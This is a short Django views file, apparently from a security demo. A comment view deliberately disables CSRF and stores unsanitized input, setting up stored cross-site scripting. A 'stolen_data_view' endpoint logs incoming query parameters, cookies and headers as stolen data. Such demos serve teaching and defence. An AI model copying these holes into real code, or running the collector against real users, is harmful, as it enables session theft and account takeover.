from django.http.response import JsonResponse
from django.shortcuts import render, redirect
from .models import Comment
from django.views.decorators.csrf import csrf_exempt  #


# Create your views here.
@csrf_exempt  # WARNING: this deliberately disables CSRF protection - Never do this in production
def comment_view(request):
    if request.method == "POST":
        # WARNING: intentionally vulnerable - no input sanitization
        content = request.POST.get("content", "")
        Comment.objects.create(content=content)
        return redirect("comments")

    comments = Comment.objects.all().order_by("-created_at")
    return render(request, "comments.html", {"comments": comments})


@csrf_exempt
def stolen_data_view(request):
    if request.method == "GET":
        # log the stolen data - for demonstration only
        data = {
            "query_params": dict(request.GET),
            "cookies": dict(request.COOKIES),
            "headers": dict(request.headers),
        }
        print("Stolen data received: ", data)
        return JsonResponse({"status": "received"})
